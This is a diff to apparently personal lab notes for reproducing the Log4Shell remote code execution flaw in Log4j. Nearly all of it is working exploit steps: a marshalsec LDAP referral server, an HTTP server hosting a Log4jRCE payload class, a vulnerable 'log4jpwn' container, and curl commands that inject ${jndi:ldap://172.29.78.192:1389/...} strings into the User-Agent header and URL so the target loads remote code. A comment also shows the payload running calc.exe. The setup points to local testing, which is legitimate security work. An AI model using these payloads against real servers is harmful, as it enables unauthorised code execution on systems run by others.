@@ -57,9 +57,19 @@ docker run -v `pwd`/:/root/poc  marshalsec javac /root/poc/src/main/java/Log4jRC
 # https://www.cnblogs.com/mingforyou/p/3551199.html
 javac Log4jRCE.java
 php -S 127.0.0.1:8888
+python -m http.server
+http://localhost:8000/
 
-java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Log4jRCE"
+docker cp /usr/src/myapp/target/marshalsec-0.0.3-SNAPSHOT-all.jar ./
+java -cp ./marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8000/#Log4jRCE"
 
+docker run --rm --name log4jpwn -p8080:8080 log4jpwn
+
+
+curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/a}' 'localhost:8080/${jndi:ldap://172.29.78.192:1389/a}/?pwn=$\{jndi:ldap://172.29.78.192:1389/a\}'
+curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/Log4jRCELinux}' 'localhost:8080'
+curl -v -H 'User-Agent: ${jndi:ldap://172.29.78.192:1389/Log4jRCE}' 'localhost:8080'
+172.17.0.2
 # vim Log4jRCE.java
 Runtion.getRuntime().exec("calc.exe")
 python3 -m http.server
